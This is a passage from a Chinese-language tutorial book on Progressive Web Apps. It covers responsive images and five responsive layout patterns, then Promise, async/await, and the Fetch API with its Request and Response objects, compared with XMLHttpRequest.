1.125rem = 16px * 1.125 = 18px */ } } 响应式图片 一图胜千言，图片占网页流量消耗的 60%，可见其在 Web 的重要性。在上文提到图片不要超出视口的宽度，给图片设置 max-width: 100%，这确实非常有作用，那还有没有其他需要我们注意的呢。 图片的质量 现代设备的 DPR (设备像素比）都很高，iPhone X 的 DPR 是 3，因此如果我们用 375px 宽的图片在 iPhone X 上显示，实际只能利用它三分之一的设备像素点，会让图片看起来很模糊，视觉体验较差。如果我们都用 3 倍分辨率的图片来显示，实际屏幕较小的设备无法完全显示如此高清晰度的图片，就会在显示时进行压缩，这对于实际屏幕比较小的设备来说会浪费较多带宽。 为此，图片质量也需要能响应式。 这里 sizes 和 srcset 很多开发者比较陌生。在兼容性不好的浏览器里，会继续使用默认 src 属性中的图片。 srcset 定义了几组图片和对应的尺寸，格式比较简单，主要的两个部分是图片地址和图片固有宽度，单位为像素，但是这里使用 w 代替 px。 sizes 定义了一组媒体查询条件，并且指名了如果满足媒体查询条件之后，使用特定尺寸的图片。 如果开发者书写了上面代码中的图片，浏览器会根据下面的顺序加载图片。 获取设备视口宽度 从上到下找到第一个为真的媒体查询 获取该条件对应的图片尺寸 加载 srcset 中最接近这个尺寸的图片并显示 所以，如果我们在视口宽度为 375px 的设备上，会采用最接近 440px 的图片，example-480w.jpg。 如果对 srcset 和 sizes 还想了解更多，可以访问 MDN 的文档《响应式图片》。 图片艺术方向 我们提到将图片的 max-width 设置为 100%，图片就会在手机屏幕上压缩到视口的宽度，如果这张图片实际上很大，图片中的内容就会看不清，特别是如果图片主要内容集中在中间，如人像，浏览效果会比较差。遇到这样的情况，最好的方式是在不同的屏幕尺寸下采用不同的图片，让主要内容保持在视口中间，如下图。 HTML 标准中有一个标签 ，允许我们在其中设置多个图片来源，就和 ， 标签一样。 标签的作用和上面在 中设置 sizes 和 srcset 一样，都能在不同的设备宽度下显示不同的图片，笔者更建议使用 实现此效果。 图片的其他注意事项 响应式布局在 PWA 中是非常重要的概念，在实现响应式的同时，还需要关注响应式图片是否会带来性能问题。在开发过程中，还需要注意下面几个问题。 对图片进行懒加载 对于小的简单的图片，可以使用矢量图或者字体，保证在不同尺寸设备下都很清晰 对于尺寸小的图片，可以使用 Data URI 的方式，将图片转成 base64 内联在 CSS 或者 HTML 中，避免请求，但这样同样无法利用 HTTP 缓存，因此一般只对小于 1.5K 的图片做处理 挑选恰当的图片格式，PNG，JPEG 等，可以在 Android 下使用 WebP 格式 对图片进行压缩和优化 采用 CSS 和 CSS 动画代替一些简单的图片和动态图，如加载中 GIF 图 响应式布局 利用相对单位、flexbox、媒体查询等技术，开发者能应付各种类型的页面和布局，为了方便开发者能够快速上手，下面介绍 5 种常见的响应式布局模式。这些模式最初由 Luke Wroblewski 总结并提出。 为了更好的理解这些响应式布局，笔者准备了 5 个例子。 # 从 GitHub 下载代码到本地 pwa-book-demo 目录 $ git clone https://github.com/lavas-project/pwa-book-demo.git # 进入到 chapter02/responsive-web-design 目录 $ cd chapter02/responsive-web-design # 安装 npm 依赖 $ npm install -g edp # 启动 chapter02 responsive-web-design 示例 $ edp ws start 启动完成之后，访问 http://localhost:8848/ 能看到 5 个不同的目录，如 mostly-fluid，点击目录里的 index.html 就能看到不同模式的效果，尝试拖动改变浏览器的大小吧。 第一种：大体流动（Mostly Fluid） 大体流动布局的主要特点是在大屏幕上，内容区域宽度是固定的，因此在多数设备上，主要布局结构并没有很大改变，如果屏幕宽度大于内容区域，就在内容左右留白。而在视窗宽度较窄时，会逐渐掉落呈堆放，如下图所示。 大体流动布局比较简单，往往只需要少量的媒体查询就可以实现，如下代码所示。 .box { width: 100%; height: 150px; } /* 设置各个区块的颜色 */ .b1 { background: #009; } .b2 { background: #06c; } .b3 { background: #39f; } .b4 { background: #6cf; } .b5 { background: #cff; } /* 在大于 450px 时，将 .b2, .b3 宽度设置为 50% */ @media screen and (min-width: 450px) { .b2, .b3 { width: 50%; } } /* 在大于 800px 时，将 .b1, .b2 宽度设置为 50%，让 .b3, .b4, .b5 平分一行 */ @media screen and (min-width: 800px) { .b1, .b2 { width: 50%; } .b3, .b4, .b5 { width: 33.333333%; } } /* 定义最大宽度为 980px */ @media screen and (min-width: 980px) { .container { max-width: 980px; margin: auto; } } ... 第二种：列掉落 （Column Drop） 列掉落，布局中的每列随着宽度变小而逐个掉落，在视口最小的时候，每个元素都纵向堆放。和大体流动布局不同点在于，列掉落布局不会设置最大宽度，如果视口足够大，列掉落布局也会填满整个页面。媒体查询的断点选择需要根据网页本身的内容来选择。 列掉落比大体流动布局要简单，代码如下。 /* 在大于 450px 时，将 .b1 和 .b2 放置在同一行，分别占据 30% 和 70% */ @media screen and (min-width: 450px) { .b1 { width: 30%; } .b2 { width: 70%; } } /* 在大于 800px 时，.b1, .b3 各占 20% 区域，.b2 在中间占 60% */ @media screen and (min-width: 800px) { .b1, .b3 { width: 20%; } .b2 { width: 60%; } } ... 第三种：布局移位（Layout Shifter） 布局移位是最灵活的布局方式，它不仅仅将元素按照从前到后，从上到下排列，有时还会改变元素的位置。 代码如下： /* 在大于 800px 时，将 .b1 和 .b4 放置在同一行，分别占据 20% 和 80% */ @media screen and (min-width: 800px) { .b1 { width: 20%; } .b4 { width: 80%; } } ... 第四种：微调（Tiny Tweaks） 微调，意思就是在视口发生变化时，对内容进行一些小的调整，比如调整字体、图片大小或者元素间距等。 .b1 { background: #39f; text-align: center; padding-top: 10%; font-size: 1em; } @media screen and (min-width: 450px) { .b1 { font-size: 2em; } } @media screen and (min-width: 800px) { .b1 { font-size: 4em; } } ... 字体大小 第五种：画布溢出（Off Canvas） 在画布溢出布局中，内容不是从上到下的，而是将不常用的内容，比如应用菜单和导航栏，折叠起来，留下一个打开的入口，只有当屏幕足够大的时候才显示。画布溢出布局很常见，不仅在 Web App 中，在 Native App 中使用更多。这样的布局一般都需要配合 JavaScript 使用。 在示例中，我们通过 transform: translate(-275px, 0) 将左侧侧边栏隐藏在视口外，点击菜单后，菜单栏会从左侧划出。在页面视口大于 800 时，将布局改为 flexbox 弹性布局，直接显示左侧菜单栏，代码如下。 nav { width: 275px; height: 100%; position: absolute; /* 将菜单栏隐藏起来 */ transform: translate(-275px, 0); transition: transform 0.3s ease-in-out; background: #39f; z-index: 2; } nav.open { transform: translate(0, 0); } /* 在视口大于 800px 时，将菜单栏直接显示出来 */ @media screen and (min-width: 800px) { nav { position: relative; transform: translate(0, 0); } body { display: flex; flex-flow: wrap; } main { width: auto; flex: 1; } } ... let mask = document.querySelector('#mask') let nav = document.querySelector('nav') let menu = document.querySelector('a') // 点击菜单，显示或隐藏菜单栏 menu.addEventListener('click', event => { nav.classList.toggle('open') mask.classList.toggle('open') }) // 点击遮罩，隐藏菜单栏 mask.addEventListener('click', event => { nav.classList.remove('open') mask.classList.remove('open') }) 以上就是比较常见的 5 种响应式布局模式，大多数情况下都需要多种模式同时使用。 总结 响应式布局从设计角度出发，借助视口设置、CSS 媒体查询等方法，使开发者可以更易于维护适用于不同尺寸屏幕的网页。在本节中，我们介绍了一些文字、图片以及布局方面常见的响应式设计最佳实践，开发者应用这些经验，可以更好的优化 PWA 在不同尺寸大小设备的用户体验。 Copyright ©2019 Baidu BrilliantOpenWeb 本书采用 知识共享署名-非商业性使用 4.0 国际许可协议 进行许可。            该文件修订时间： 2019-05-22 14:25:16 "},"chapter03.html":{"url":"chapter03.html","title":"第3章 基础技术简介","keywords":"","body":"基础技术简介 PWA 是建立在现代前端技术和标准之上的，因此在介绍 PWA 特别是 Service Worker 相关的内容时，会频繁地使用一些方法和对象。它们有的不属于 PWA 的范畴，有的不一定要配合 Service Worker 使用，但它们都属于 PWA 的基础，对它们的学习将有助于后面章节理解，因此有必要花些篇幅进行介绍。 在本章内容当中，将首先介绍 ES6 标准给出的异步编程解决方案 Promise，它是 PWA 所有异步方案的基础，然后进一步介绍更直观的异步方案 Async 函数。在有了最新的异步编程概念之后，紧接着介绍如何使用 Fetch API 发送异步请求，并与 XMLHttpRequest 进行比对。最后介绍了对资源进行缓存的方法，包括用于缓存资源请求响应的 Cache API 和本地非关系型数据库 IndexedDB，为后面利用 Service Worker 实现离线缓存功能提供了基础。 Copyright ©2019 Baidu BrilliantOpenWeb 本书采用 知识共享署名-非商业性使用 4.0 国际许可协议 进行许可。            该文件修订时间： 2019-05-17 16:26:29 "},"chapter03/1-promise.html":{"url":"chapter03/1-promise.html","title":"3.1 Promise","keywords":"","body":"Promise 在深入介绍 Service Worker 之前，先来简单了解一下 Promise API，因为 Service Worker 的所有的接口内部都是采用 Promise 实现，如果对 Promise 不了解的话理解起来会比较吃力，当然，如果对 Promise 非常了解的读者可以跳过这部分的介绍。 什么是 Promise Promise 可以做很多事情。但现在只需要知道，如果有什么返回了一个 Promise 对象，那就可以在后面加上 .then() 来传入 Promise 内的逻辑执行成功和失败的回调函数。也可以在后面加上 .catch() 如果你想添加一个 Promise 内逻辑执行失败的回调函数。 如果在 JavaScript 中存在异步操作，以前通常是采用回调的方式来实现，假设现有一个异步操作的 requestAsync() 方法用来发送异步请求，如下代码所示： requestAsync('/some/path', (err, result) => { if (err) { // 请求失败的时候 throw err } // 请求成功的时候 console.log(result) }) 如果这样的回调函数多几层的话，比如异步操作依赖另一个异步操作的结果，那这样的代码看起来会是一团糟。而 Promise 可以把类似的异步处理对象和处理规则进行精简并规范化，并按照采用统一的接口来编写，而采取规定方法之外的写法都会出错，比如上面的异步操作可以采用 Promise 的写法改写，代码如下所示： let promise = requestAsyncPromise('/some/path') promise.then(result => { // 请求成功时的处理 console.log(result) }).catch(err => { // 请求失败时的处理 }) 也就是说，除 Promise 对象规定的方法（如这里的 .then() 或 .catch()）以外的方法都是不可以使用的，而不会像异步回调函数方式那样可以自己自由地定义回调函数的参数。Promise 必须严格遵守固定、统一的编程方式来编写代码。这样基于 Promise 的统一接口的做法，就可以处理各种各样的异步操作了。所以 Promise 的功能是可以将复杂的异步处理轻松地进行固定模式化，这也可以说得上是使用 Promise 的理由之一。 Promise 简介 在 ES6 Promises 标准中定义的 promise 对象大致有三种类型：构造函数型、实例方法型、静态方法型。 构造函数型 可以从 Promise 构造函数中直接来创建一个新 promise 对象。可以使用 new 操作来调用 Promise 的构造器来进行实例化，如下代码所示： let promise = new Promise((resolve, reject) => { // 异步处理 // 处理结束后、调用 resolve 或 reject if (/*处理成功*/) { resolve('promise 成功') } else { reject('promise 失败') } }) 对象方法型 对于通过 new 操作实例化的 promise 对象，通过 promise.then() 实例方法可以指定其后续执行的回调函数，如下代码所示： promise.then(onFulfilled, onRejected) resolve 时 onFulfilled 会被调用 reject 时 onRejected 会被调用 onFulfilled、onRejected 两个都为可选参数。 promise.then() 在成功和失败时都可以使用。另外在只想对异常进行处理时可以采用 promise.then(undefined, onRejected) 这种方式，只需要指定 reject 时的回调函数即可。当然这种情况还是使用更加规范的 promise.catch(onRejected) 比较好。 静态方法型 像 Promise 这样的全局对象还拥有一些静态方法。例如 Promise.all()，还有 Promise.resolve() 等在内，主要都是一些对 Promise 进行操作的辅助方法，其返回的都是 promise 对象。 Promise 状态 通过前面的介绍大概了解了 Promise 的处理流程，接下来再了解一下 Promise 的状态。 用 new Promise() 实例化的 promise 对象有以下三个状态。 Fulfilled：resolve 时。此时会调用 onFulfilled。 Rejected：reject 时。此时会调用 onRejected。 Pending：既不是 resolve 也不是 reject 的状态。也就是 promise 对象刚被创建后的初始化状态等。 图 4-3 展示了 Promise 三种状态之间的关系： promise 对象的状态从 Pending 转换为 Fulfilled 或 Rejected 之后，这个 promise 对象的状态就不会再发生任何变化。也就是说，Promise 与 Event 等不同，在 .then() 后执行的函数可以肯定地说只会被调用一次。另外，Fulfilled 和 Rejected 这两个中的任一状态都可以表示为 Settled（不变的）。 Copyright ©2019 Baidu BrilliantOpenWeb 本书采用 知识共享署名-非商业性使用 4.0 国际许可协议 进行许可。            该文件修订时间： 2019-05-17 16:26:29 "},"chapter03/2-async-function.html":{"url":"chapter03/2-async-function.html","title":"3.2 Async 函数","keywords":"","body":"Async 函数 上一节介绍了 Promise 对象，我们可以很方便地利用 Promise 将过去基于回调函数的异步过程改造成基于链式调用实现，这样更符合我们线性的思维习惯。但实践过程中发现，这种链式调用的异步方案仍然不够直观，我们更希望采用类似于同步函数的书写方式来实现异步。因此在 ES2017 标准中引入了 Async 函数（Async Functions）用于进一步简化异步编程。 需要注意的是，由于 Async 函数语法比较新，目前只在最新版的浏览器上得到了支持，因此在项目中如果使用了 Async 函数，可能需要准备 Babel 等代码编译工具，将 Async 函数语法转换成 ES5 语法实现。 首先我们通过一个简单的例子来演示 Async 函数的作用。 在这之前首先准备一个异步函数 sleep()，其作用是将 setTimeout 方法用 Promise 对象进行包装： function sleep (time) { return new Promise(function (resolve) { setTimeout(resolve, time) }) } 通过上一节的学习我们知道可以通过链式调用 Promise.then 方法来实现异步过程。比如下面的例子当中，在执行 main() 1 秒之后将在控制台打印出“结束”的文案的实现如下所示： function main () { console.log('开始：' + new Date()) return sleep(1000) .then(() => { console.log('结束：' + new Date()) }) } 接下来改用 Async 函数来实现同样功能的函数： async function main () { console.log('开始：' + new Date()) await sleep(1000) console.log('结束：' + new Date()) } 可以看到，通过使用 async 和 await 修饰符改写之后的 main() 就不再需要书写复杂的 Promise 链式调用了，同时 Async 函数的语法也更为接近同步函数，无论是书写体验还是阅读体验都得到了较大的提升。 语法说明 Async 函数定义 Async 函数需要通过 async 修饰符进行定义，下面所举例的定义方式都是合法的： // 普通函数 async function foo (/* 参数 */) {/* 函数体 */} // 匿名函数 const foo = async function () {} // 箭头函数 const foo = async () => {} // 对象方法简写 const obj = { async foo () {} } // 函数作为参数 list.map(async () => {}) Async 函数会将函数体的所有执行结果通过一个隐式的 Promise 对象返回： async function foo () {} // 等价于 function foo () { return new Promise(resolve => resolve()) } async function foo () { return 'Hello World' } // 等价于 function foo () { return new Promise(resolve => resolve('Hello World')) } async function foo () { let promise = new Promise(resolve => resolve('Hello World')) return promise } // 等价于 function foo () { let promise = new Promise(resolve => resolve('Hello World')) return new Promise(resolve => resolve(promise)) } Async 函数错误处理 假如 Async 函数的函数体在执行过程中存在未捕获的错误，那么返回的 Promise 对象将会通过 reject 方法将异常值传递下去： async function foo () { throw Error('出错了') } // 等价于 function foo () { return new Promise((resolve, reject) => reject(Error('出错了'))) } 假如 Async 函数返回了异步的错误，也就是返回的 Promise 对象状态变更为 rejected， async function foo () { return Promise.reject('出错了') } // 等价于 function foo () { return new Promise(resolve => resolve( Promise.reject('出错了') )) } 这样一来都可以通过链式调用来捕获异常： foo().then( () => {}, e => { // 打印 '出错了' console.log(e) } ) // 或 foo().catch(e => { // 打印 '出错了' console.log(e) }) await 表达式定义 Async 函数的函数体中可能存在 await 表达式。await 表达式非常简单，只需要在 Promise 对象前增加 await 关键字即可，同时 await 表达式的返回值就是 Promise 通过 resolve() 所返回的结果： async function main () { // sleep(1000) 返回 Promise 对象，并在 1s 后 resolve await sleep(1000) // val1 === 'Hello World' let val1 = await Promise.resolve('Hello World') // 等待 1s 后对 val2 进行赋值 // val2 === 'Hello World' let val2 = await sleep(1000).then(() => 'Hello World') } await 表达式可以作为 Async 函数的返回结果： async function main () { return await sleep(1000).then(() => 'Hello World') } main().then(result => { // 打印 Hello World console.log(result) }) 当 await 关键字后面跟的不是 Promise 对象，会自动将其转换为 Promise 对象的返回结果： // 以下代码从 Async 函数体内节选 let val = await 'Hello World' // 等价于 let val = await Promise.resolve('Hello World') 当 Async 函数执行到 await 表达式的时候会暂停执行，等待 await 表达式的 Promise 对象状态发生变更之后，再去执行后续的步骤。 await 表达式错误用法 需要强调的是，await 表达式只能在 Async 函数中使用，如果在这个范围之外使用，程序将会报语法错误（SynaxError）。下面的例子举例了一些常见的错误用法： // 错误，await 表达式必须在 Async 函数中执行 await sleep(1000) function foo () { // 错误，foo 不是 Async 函数 await sleep(1000) } async function main () { const foo = () => { // 错误，因为该匿名函数不是 Async 函数 await sleep(1000) } } async function bar () { let intervals = [1000, 1000, 2000] intervals.forEach(interval => { // 错误，因为该匿名函数不是 Async 函数 await sleep(1000) }) } await 表达式异常捕获 await 关键字后面跟的 Promise 对象可能会执行 reject，这时 await 表达式就会抛出异常，异常值就是 reject 方法所回传的值。我们可以通过 try/catch 捕获这个异常并进行处理： async function foo () { try { await Promise.reject('发生错误') } catch (e) { // 打印 '发生错误' console.log(e) } } 其效果与直接对 Promise 对象的异常进行捕获是等价的： async function foo () { await Promise.reject('发生错误') // 打印 '发生错误' .catch(e => console.log(e)) } 如果不对 await 表达式的抛错进行捕获处理，那么这个错误会继续向外传递，并最终以 Promise.reject 的方式将错误抛到 Async 函数外部： async function foo () { await Promise.reject('发生错误') } // 打印 '发生错误' foo().catch(e => console.log(e)) Async 函数用法举例 通过上面的学习对 Async 函数的语法和功能有了一定的了解之后，接下来我们准备几个示例来加深理解。 常规用法 在本示例中，将演示如何定义并使用异步函数、读取异步数据、捕获异步异常等等。 这个示例演示了这样一个过程，首先执行 getRandomNumber() 异步地获取一个 0 - 1 之间的随机数，然后送入 shouldLargerThan() 方法进行检查，当随机数小于给定的数值 0.5 时，抛出异常，反之则通过。 首先简单实现 getRandomNumber 和 shouldLargerThan 的功能： // 一秒后返回一个 0 - 1 的随机数 async function getRandomNumber () { await sleep(1000) return Math.random() } // 一秒后查看传入的数字是否大于期望值 spec async function shouldLargerThan (spec, num) { await sleep(1000) // 当数值小于 0.5 时抛出异常 if (num 接下来就可以定义执行整个异步过程的 Async 函数 run()： async function run () { // 获取异步数据 let num = await getRandomNumber() console.log(num) try { await shouldLargerThan(0.5, num) } catch (e) { // 捕获异常 // 打印 '小于 0.5' console.error(e) } console.log('结束') } run().then(() => console.log('任务全部执行完毕')) // ... （等待 1s） // 0.3（假设生成的随机数为 0.3） // ... （等待 1s） // 小于 0.5 // 结束 // 任务全部执行完毕 顺序执行异步操作 首先我们定义 3 个异步执行的任务，他们都会在任务开始的时候打印任务开始信息，等待一秒之后再打印任务结束信息。 async function task1 () { console.log('Task1 开始') await sleep(1000) console.log('Task1 结束') } async function task2 () { console.log('Task2 开始') await sleep(1000) console.log('Task2 结束') } async function task3 () { console.log('Task3 开始') await sleep(1000) console.log('Task3 结束') } 如果我们需要按顺序依次执行这些任务，根据前面所学内容，可以利用 await 表达式实现： async function main () { await task1() await task2() await task3() } main() // Task1 开始 // ... （等待 1s） // Task1 结束 // Task2 开始 // ... （等待 1s） // Task2 结束 // Task3 开始 // ... （等待 1s） // Task3 结束 我们可以使用 for 循环来简化这一过程，下面的示例展示了使用 for 循环实现同样的效果，读者可以自行尝试使用 for...of 或者 while 等循环语句实现： async function main () { const tasks = [task1, task2, task3] for (let i = 0; i 需要注意的是，这里的 for 循环无法用 forEach 代替，这是因为 forEach 只会同步执行它的回调函数，不会受到 await 的阻塞影响： tasks.forEach(async task => await task()) // 等价于 for (let task of tasks) { task() } 并发执行异步操作 假设我们需要这些任务并行执行，那么不使用 await 表达式就能够实现： function main () { task1() task2() task3() } main() // Task1 开始 // Task2 开始 // Task3 开始 // ... （等待 1s） // Task1 结束 // Task2 结束 // Task3 结束 上面的函数可以使用 for/while/forEach 等等各种循环方法来进行简化： function main () { const tasks = [task1, task2, task3] tasks.forEach(task => task()) } 假设我们需要在所有的任务全部完成之后去执行某些操作，那么可以结合 Promise.all 方法实现： async function main () { await Promise.all([ task1(), task2(), task3() ]) console.log('任务全部执行完毕') } main() // Task1 开始 // Task2 开始 // Task3 开始 // ... 等待 1s // Task1 结束 // Task2 结束 // Task3 结束 // 任务全部执行完毕 我们也可以利用 Array.map 来简化这一过程： async function main () { const tasks = [task1, task2, task3] const promises = tasks.map(task => task()) await Promise.all(promises) console.log('任务全部执行完毕') } Copyright ©2019 Baidu BrilliantOpenWeb 本书采用 知识共享署名-非商业性使用 4.0 国际许可协议 进行许可。            该文件修订时间： 2019-05-17 16:26:29 "},"chapter03/3-fetch-api.html":{"url":"chapter03/3-fetch-api.html","title":"3.3 Fetch API","keywords":"","body":"Fetch API Fetch API 是目前最新的异步请求解决方案，它在功能上与 XMLHttpRequest（XHR）类似，都是从服务端异步获取数据或资源的方法。对于有过 AJAX 开发经验的读者应该深有体会，基于 XHR 的异步请求方法在实现上比较复杂。下面简单演示如何通过 XHR 发送异步请求： // 实例化 XMLHttpRequest let xhr = new XMLHttpRequest() // 定义加载完成回调函数，打印结果 xhr.onload = function () { console.log('请求成功') } // 定义加载出错时的回调函数，打印错误 xhr.onerror = function (err) { console.error('请求失败') } // 设置请求目标 xhr.open('GET', '/path/to/text', true) // 开始发起请求 xhr.send() 从上面的代码当中可以感受到，基于事件回调机制的 XHR 在编程实现的思路上非常反思维，要实现这样一个简单的 GET 请求所需代码较多，一旦功能变得复杂很容易会造成混乱。因此在实际应用当中，一般会选择封装好的函数进行使用，比如较为常见的是 jQuery 所提供的 $.ajax 方法。 接下来使用 Fetch API 来实现上述功能： fetch('/path/to/text', {method: 'GET'}) .then(response => { console.log('请求成功') }) .catch(err => { console.error('请求失败') }) 经过对比可以发现，在使用 Fetch API 之后，代码逻辑变得更清晰，所需的代码也变得更少。当然 Fetch API 的优点还不止这些，在本节的内容当中，将逐步对 Fetch API 进行更加深入的学习。 兼容性 Fetch API 的标准目前由 WHATWG 组织进行制定与维护，虽然尚未纳入 W3C 规范当中，但从 Can I Use 网站的统计数据来看，各大主流浏览器已经基本上实现了对 Fetch API 的支持。 对于尚未支持或支持度不完整的浏览器，开源社区也提供了相关 Polyfill，开发者可以通过 npm 进行安装和使用： npm install --save whatwg-fetch 安装完成之后，只需在 JS 入口文件引入 Polyfill 即可： import 'whatwg-fetch' // 引入 polyfill 之后，就可以正常使用 Fetch API 了 window.fetch(/* 相关参数 */) 对于不使用 npm 的项目，也可以到 whatwg-fetch 的 GitHub 主页直接下载并使用 fetch.umd.js 文件。 概念和用法 Fetch API 首先提供了网络请求相关的方法 fetch()，其次还提供了用于描述资源请求的 Request 类，以及描述资源响应的 Response 对象，这样就能够以一种统一的形式将资源的请求与响应过程应用到更多的场景当中。 fetch() Fetch API 提供了 fetch() 用来发起网络请求并获得资源响应。它的使用方法非常简单，相关语法如下所示： fetch(request).then(response => {/* 响应结果处理 */}) 可以看到，fetch() 需要传入一个 Request 对象作为参数，fetch() 会根据 request 对象所描述的请求信息发起网络请求；由于网络请求过程是个异步过程，因此 fetch() 会返回 Promise 对象，当请求响应时 Promise 执行 resolve 并传回 Response 对象。 除了直接以 Request 对象作为参数之外，fetch() 还支持传入请求 URL 和请求配置项的方式，fetch() 会自动根据这些参数实例化 Request 对象之后再去发起请求，因此以下代码所展示的请求方式都是等价的： fetch(new Request('/path/to/resource', {method: 'GET'})) // 等价于 fetch('/path/to/resource', {method: 'GET'}) 需要注意的是，fetch() 只有在网络错误或者是请求中断的时候才会抛出异常，此时 Promise 对象会执行 reject 并返回错误信息。因此对于 fetch() 来说，服务端返回的 HTTP 404、500 等状态码并不认为是网络错误，因此除了检查 Promise 是否 resolve 之外，还需要检查 Response.status、Response.ok 等属性以确保请求是否成功响应。下面的示例代码通过检查响应 status 是否为 200 来判断请求是否成功： fetch('/path/to/resource').then(response => { if (response.status === 200) { // 请求成功 } else { // 请求失败 } }) .catch(err => { // 网络请求失败或请求被中断 }) Request Request 是一个用于描述资源请求的类，通过 Request() 构造函数可以实例化一个 Request 对象，其语法如下所示： let request = new Request(input, init) 其中，input 代表想要请求的资源，可以是资源的 URL，或者是描述资源请求的 Reqeust 对象；init 为可选参数，可以用来定义请求中的其他选项。可以注意到，Request 构造函数所需参数与 fetch() 方法的参数是一样的。下面将通过一些例子来演示一些常见请求类型的实例化方法： 1.GET 请求，请求参数需要写到 URL 当中。 let getRequest = new Request('/api/hello?name=lilei', { method: 'GET' }) 2.POST 请求，请求参数需要写到 body 当中。 let postRequest = new Request('/api/hello', { method: 'POST', // body 可以是 Blob、FormData、字符串等等 body: JSON.stringify({ name: 'lilei' }) }) 3.自定义请求的 Headers 信息。 let customRequest = new Request('/api/hello', { // 这里展示请求 Content-Type 为 text/plain 的资源 headers: new Headers({ 'Content-Type': 'text/plain' }) }) 4.设置发起资源请求时带上 cookie。 let cookieRequest = new Request('/api/hello', { credentials: 'include' }) init 对象还可以配置其他参数，此处先不做展开，在后续的内容当中会针对一些特定参数做进一步说明。 由于在后面实现资源请求的拦截代理时，需要对拦截的请求进行判断分类，也就是对 Request 对象的属性进行检查，因此介绍一下 Request 对象常用的几个属性： url：String 类型，只读，请求的 url； method：String 类型，只读，请求的方法，如 'GET'，'POST' 等； headers：Headers 类型，只读，请求的头部，可通过 get() 方法获取 'Content-Type'，'User-Agent' 等信息。 下面举例使用以上属性对请求进行判断： if (request.url === 'https://example.com/data.txt') { // ... } if (request.method === 'POST') { // ... } if (reuqest.headers.get('Content-Type') === 'text/html') { // ... } Response Response 类用于描述请求响应数据，通过 Response() 构造函数可以实例化一个 Response 对象，其实例化语法如下所示： let response = new Response(body, init) 其中 body 参数代表请求响应的资源内容，可以是字符串、FormData、Blob 等等；init 为可选参数对象，可用来设置响应的 status、statusText、headers 等内容。下面举例说明如何构造一个 index.js 的响应： let jsResponse = new Response( // index.js 的内容为，在控制台打印 \"Hello World!\" 'console.log(\"Hello World!\")', { // 定义状态码为请求成功 status: 200, // 通过 headers 定义 JS 的 Content-Type headers: new Headers({ 'Content-Type': 'application/x-javascript' }) } ) 在实际应用当中，我们一般会通过 fetch()、Cache API 等等获得请求响应对象，然后再对响应对象进行操作。 判断请求是否成功 前面在介绍 fetch() 时提到，对于服务端返回 HTTP 404、500 等错误码 fetch() 不会将其当成网络错误，这时就需要对 Response 对象的相关属性进行检查。 status：Number 类型，包含了 Response 的状态码信息，开发者可以直接通过 status 属性进行状态码检查，从而排除服务端返回的错误响应； statusText：String 类型，包含了与状态码一致的状态信息，一般用于解释状态码的具体含义； ok：Boolean 类型，只有当状态码在 200-299 的范围时，ok 的值为 true。 除了上述提到的属性之外，也同样可以借助 headers 等属性进行辅助判断，具体检查方式与实际需求有关。下面举例如何使用 ok 和 status 进行判断： if (response.ok || response.status === 0) { // status 为 0 或 200-299 均代表请求成功 } else { // 请求失败 } 读取响应体 Fetch API 在设计的时候就采用了数据流的形式去操作请求体和响应体，这样在传输大数据或大文件时会非常有优势。Response 的 body 属性暴露了一个 ReadableStream 类型的响应体内容。Response 提供了一些方法来读取响应体： text()：解析为字符串； json()：解析为 JSON 对象； blob()：解析为 Blob 对象； formData()：解析为 FormData 对象； arrayBuffer()：解析为 ArrayBuffer 对象 这些方法读取并解析响应体的数据流属于异步操作，因此这些方法均返回 Promise 对象，当读取数据流并解析完成时，Promise 对象将 resolve 并同时返回解析好的结果。下面的示例将简单演示如何读取 JSON 格式的响应体： // 构造 Response 对象 let response = new Response(JSON.stringify({name: 'lilei'})) // 通过 response.json() 读取请求体 response.json().then(data => { console.log(data.name) // 打印 'lilei' }) 由于 Response 的响应体是以数据流的形式存在的，因此只允许进行一次读取操作。通过检查 bodyUsed 属性可以知道当前的 Response 对象是否已经被读取： let response = new Response(JSON.stringify({name: 'lilei'})) console.log(response.bodyUsed) // false response.json().then(data => { console.log(response.bodyUsed) // true }) 由于二次读取响应体内容会导致报错，因此为了保险起见，可以在进行响应体读取前首先判断 bodyUsed 属性再决定下一步操作。 拷贝 Response Response 提供了 clone() 方法来实现对 Response 对象的拷贝： let clonedResponse = response.clone() clone() 是一个同步方法，克隆得到的新对象在所有方面与原对象都是相同的。在这里需要注意的是，如果 Response 对象的响应体已经被读取，那么在调用 clone() 方法时会报错，因此需要在读取响应体读取前进行克隆操作。 Fetch API 与 XHR 的对比 通过上面的介绍可以发现，从功能上看，Fetch API 和 XHR 做的事情都是相似的，都实现了异步请求与资源获取。但从 API 的具体使用和实现方式上，两者存在着较大区别： 1.Fetch API 的异步机制更为先进 XHR 采用回调机制实现异步，这种机制不太符合人脑线性的思维方式，在较为复杂的异步场景中如果存在大量的回调，很容易带来代码可读性差的问题。当然我们也可以利用 Promise 将 XHR 包装成返回 Promise 对象的函数来解决上述问题，但这种封装的函数毕竟不如原生方法来得简洁。 Fetch API 则直接采用 Promise 实现异步机制，通过链式调用 Promise.then() 方法，就能够直接按照线性的思维去组织异步操作中的每个步骤，同时借助 Promise.all、Promise.race 等方法，还能够高效地组织多个异步操作来实现更为复杂的功能。 2.Fetch API 更为简洁 在使用 XHR 进行异步请求时会发现，XHR 实例属性包含了请求描述、响应描述，以及各种事件、请求操作方法等等，显得相当混乱。 Fetch API 在设计的时候不仅仅实现了 fetch() 这个方法，还根据异步请求中所需要的数据格式拆分出 Request、Response、Headers、Body 等一系列原生对象，彼此各司其职，符合关注点分离原则，因此在使用上会显得更加简洁，更加语义化。 3.Fetch API 的应用范围更广 目前 XHR 已经无法在 Service Worker 作用域下进行使用，在 Service Worker 作用域当中发起异步请求的方法只有 Fetch API。这也许只是个开始，XHR 在过去已经很好地完成它的历史使命，但由于 XHR 在设计上已经逐渐不适应现代编程理念，因此在未来 XHR 的应用范围将可能会变得越来越窄，而 Fetch API 这类基于新理念和新技术所设计的 API 将逐渐发挥出越来越重要的作用。 Fetch API 处理跨域请求 当涉及到前后端通信问题的时候，就不得不提请求跨域的情况。由于受到 Web 同源策略的影响，在使用 Fetch API 默认配置情况下发送异步请求，会受到跨域访问限制而导致资源请求失败。 我们通常采用跨域资源共享机制（CORS）来解决这个问题。在跨域服务端支持 CORS 的前提下，通过将 fetch() 的请求模式设置为“cors”，就可以简单地实现跨域请求。在这种请求模式下，返回的请求响应是完全可访问的： // 假设当前页面 URL 为 https://current.com fetch('https://other.com/data.json', { mode: 'cors' }) .then(response => { console.log(response.status) // 200 console.log(response.type) // 'cors' console.log(response.bodyUsed) // false return response.json() }) .then(data => { console.log(data.name) // 'lilei' 